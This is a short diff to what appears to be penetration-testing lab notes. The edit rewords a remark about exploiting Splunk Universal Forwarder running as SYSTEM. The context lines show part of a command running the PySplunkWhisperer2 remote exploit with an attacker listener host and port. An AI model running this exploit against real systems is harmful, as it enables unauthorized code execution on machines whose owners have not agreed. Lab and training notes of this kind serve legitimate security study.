@@ -618,7 +618,7 @@ python3 PySplunkWhisperer2_remote.py \
   --lhost $LHOST --lport 9999
 ```
 
-> Universal Forwarder running as SYSTEM on Windows — one of the highest-value RCEs in OSCP labs.
+> Universal Forwarder running as SYSTEM on Windows — one of the highest-value unauthenticated RCEs in lab environments.
 
 ---
 
